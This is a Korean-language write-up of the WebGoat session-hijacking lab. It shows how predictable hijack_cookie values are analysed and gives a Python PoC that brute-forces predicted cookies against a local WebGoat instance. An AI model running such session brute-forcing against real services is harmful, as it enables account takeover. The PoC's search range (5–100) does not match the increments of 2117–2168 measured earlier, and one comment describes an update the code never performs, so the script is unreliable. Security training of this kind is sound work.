## 취약점 발생 배경과 목표
개발이 진행되는 동안, 개발자들은 보안에 기초적인 키 값의 복잡성과 무작위성을 고려하지 않는 경우가 많다. 특히 세션 ID 같은 민감 정보(Credential Information)가 탈취당하면 해당 서비스는 매우 취약해진다.

따라서, 이번 페이지에서는 타인이 보유한 세션 ID를 탈취하는 것을 간단히 실습하여 본다.

## Hijack a session

### Recon
![[Pasted image 20260304120304.png]]
*▲ 문제- 'hijack_cookie'의 값을 맞춰보셈*

사용자 환경에 남아있는 **쿠키 값**과 **버튼을 누르면 발급되는 쿠키 값**을 같게 만들어줘야 한다.<br>

![[Pasted image 20260304121052.png]]
*▲버튼 누르고 식별된 /WebGoat/HijackSession/login 패킷*

'Access' 버튼을 눌렀을 때, RES에서 Set-Cookie로 새로운 쿠키 값이 발급된다.<br>
해당 쿠키 값은 `-`를 기준으로 앞부분과 뒷부분으로 나뉘어서 각각의 규칙을 갖고 증가하는 꼴을 보인다.


![[Pasted image 20260304141517.png]]
*▲ 예상 구조*

다음과 같은 구조로 동작한다고 생각하면, Ⅲ 단계에서 통과할 수 있게 new_hijack_cookie가 생성되는 규칙을 찾는 것이 중요하다.

정리하자면, 본 취약점은 예측 가능한 쿠키 값(세션 ID)을 사용하였기 때문에 발현되며, 무작위 대입(Brute-Force) 공격에 취약하다.

---
### Solve

밑에서 하는 작업들은 Burp Suite의 Intruder 기능을 사용하여 수행이 가능하지만, 무료 버전에서는 속도 제한이 걸려있어 느리다..!

따라서, 해당 페이지에서는 python의 `Requests` 모듈을 사용하여 풀이를 진행한다.

무작위 대입 공격을 시작하기 전에, 범위를 어림잡아 구해보자.

> [!code]- 📒무작위 대입 범위 확인을 위한 코드
> ``` python
> import requests
> import time
> 
> url = "http://localhost:58080/WebGoat/HijackSession/login"
> count = 100  # 분석할 샘플 개수
> initial_cookies = {"JSESSIONID": "856FBAA713CEFADF80D3C8D4FF433A36"}
> data = {"username": "", "password": ""}
> 
> history = []
> 
> print(f"{'No.':<4} | \t\t{'Full Cookie'}\t\t | {'A 차이':<6} | {'B 차이':<8}")
> print("-" * 70)
> 
> for i in range(count):
>     response = requests.post(url, cookies=initial_cookies, data=data)
>     cookie_val = response.cookies.get('hijack_cookie')
>     
>     if cookie_val and '-' in cookie_val:
>         # 섹션 분리 및 숫자 변환
>         sec_a, sec_b = map(int, cookie_val.split('-'))
>         
>         if i == 0:
>             diff_a = diff_b = 0
>         else:
>             # 이전 값과의 차이 계산
>             diff_a = sec_a - history[-1][0]
>             diff_b = sec_b - history[-1][1]
>         
>         history.append((sec_a, sec_b))
>         print(f"{i+1:<4} | {cookie_val:<20} | {diff_a:+8} | {diff_b:+8}")
>     
>     time.sleep(0.1)
> 
> # 범위 분석 결과
> if len(history) > 1:
>     diffs_a = [history[i][0] - history[i-1][0] for i in range(1, len(history))]
>     diffs_b = [history[i][1] - history[i-1][1] for i in range(1, len(history))]
>     
>     print("-" * 50)
>     print(f"[변동 범위 분석]")
>     print(f"A 섹션: 최소 변동 {min(diffs_a)} ~ 최대 변동 {max(diffs_a)}")
>     print(f"B 섹션: 최소 변동 {min(diffs_b)} ~ 최대 변동 {max(diffs_b)}")
>```

#### 실행 결과

100회 반복하여 확인해보니, 각 부분의 변동폭은 앞 부분이 \[1,2\], 뒷 부분이 \[2117,2168\]로 확인됐다.

![[Pasted image 20260304143132.png]]
*▲ 공격 방식*

응답 패킷으로 받은 값에 찾은 규칙을 앞, 뒤 부분에 적용하여 예상 쿠키 값을 만들고 (Ⅴ단계), 이를 서버로 보내서(Ⅰ단계) 응답 패킷의 크기가 틀렸을 때와 다르면 멈추어서 응답 패킷을 출력하게 한다.

### POC

``` python
import requests
import random
import time

# 0. 세션 설정 (네트워크 오버헤드 감소)
session = requests.Session()

# 1. 환경 설정
url = "http://localhost:58080/WebGoat/HijackSession/login"
headers = {
    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
}
jsessionid = "856FBAA713CEFADF80D3C8D4FF433A36" 

# 2. 초기 응답 크기 확인 (실패 기준점 잡기)
def get_baseline():
    test_cookies = {"JSESSIONID": jsessionid}
    res = session.post(url, headers=headers, cookies=test_cookies, data={"username": "", "password": ""})
    return len(res.content), res.cookies.get('hijack_cookie')

baseline_size, initial_cookie = get_baseline()
print(f"[*] 기준 응답 크기: {baseline_size} bytes")

start_a, start_b = map(int, initial_cookie.split('-'))

print(f"[*] 시작 포인트: A={start_a}, B={start_b}")
print("-" * 50)

# 3. 무한 루프 공격 시작
count = 1
for a in range(1, 3):
    # [V단계] 예측 쿠키 생성 (A는 +1, B는 랜덤 범위 가산)
    predict_a = start_a + a
    for b in range(5, 100):
        predict_b = start_b + b
        predict_cookie = f"{predict_a}-{predict_b}"
        
        predict_cookies = {
            "JSESSIONID": jsessionid,
            "hijack_cookie": predict_cookie
        }

        try:
            response = session.post(url, headers=headers, cookies=predict_cookies, data={"username": "", "password": ""})
            current_size = len(response.content)

            # 성공 여부 체크 (응답 크기가 다르면 성공)
            if current_size != baseline_size:
                print(f"\n[!!!] 하이재킹 성공!")
                print(f"[*] 시도 횟수: {count}")
                print(f"[*] 당첨 쿠키: {predict_cookie}")
                print(f"[*] 응답 크기: {current_size}")
                print("-" * 30)
                print(response.text) # 성공 메시지(플래그 등) 출력
                break
            
            # 실패 시: 서버에게 새로 Set-Cookie 값을 읽어서 다음 루프의 기준점으로 업데이트
            print(f"\r[{count}] 실패: {predict_b-start_b}", end="")

            count += 1

        except Exception as e:
            print(f"\n[!] 오류 발생: {e}")
            break
```
